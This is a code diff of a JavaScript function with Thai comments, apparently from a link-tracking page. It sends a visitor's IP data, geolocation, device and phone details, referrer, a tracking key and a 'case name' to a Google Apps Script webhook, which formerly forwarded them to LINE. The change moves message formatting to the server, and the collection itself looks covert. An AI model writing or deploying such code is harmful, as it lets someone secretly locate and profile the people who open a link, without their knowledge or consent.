@@ -468,27 +468,23 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 }
 
 function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
-  // สร้างข้อความละเอียด
-  const detailedMessage = createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName);
+  // ส่งเฉพาะข้อมูลดิบไปที่ webhook โดยไม่สร้างข้อความเอง
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzM9uoeKK0D4wc1z_pLTUxfHeoiaXPNQblHJAqEOZ10KrMoaaXs0dLdrLhqZHWgW2JpcQ/exec';
 
-  // ส่งข้อมูลไปยัง webhook ของเรา
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzLL4s6sTEKYHtgRdvJyfaK8zx0-D3pSwZlTOd7ifK65ZR2JhW_lZbnsFHtuzAkE_kikA/exec';
-
-  // แก้ไขส่วนนี้: ทำให้แน่ใจว่าส่ง trackingKey ไปด้วยเสมอ
+  // ส่งข้อมูลพื้นฐานทั้งหมดโดยไม่สร้างข้อความ message เอง
   const dataToSend = {
-    message: detailedMessage,
     timestamp: timestamp,
     location: location,
     ip: ipData,
     deviceInfo: deviceData,
     phoneInfo: phoneInfo,
     referrer: referrer,
-    trackingKey: trackingKey || "ไม่มีค่า", // ใส่ค่าเริ่มต้นเพื่อป้องกัน undefined
-    caseName: caseName || "ไม่มีค่า" // ใส่ค่าเริ่มต้นเพื่อป้องกัน undefined
+    trackingKey: trackingKey || "ไม่มีค่า",
+    caseName: caseName || "ไม่มีค่า",
+    useServerMessage: true // เพิ่มตัวแปรแฟล็กเพื่อให้ server รู้ว่าต้องสร้างข้อความเอง
   };
 
-  // เพิ่ม console.log เพื่อตรวจสอบข้อมูลที่ส่ง
-  console.log("กำลังส่งข้อมูลไป webhook:", {
+  console.log("กำลังส่งข้อมูลไป webhook (ให้ server สร้างข้อความเอง):", {
     trackingKey: trackingKey,
     caseName: caseName
   });
@@ -503,7 +499,7 @@ function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, pho
     mode: 'no-cors'
   })
   .then(() => {
-    console.log("ส่งข้อมูลไปยัง LINE สำเร็จ");
+    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
   })
   .catch(error => {
     console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
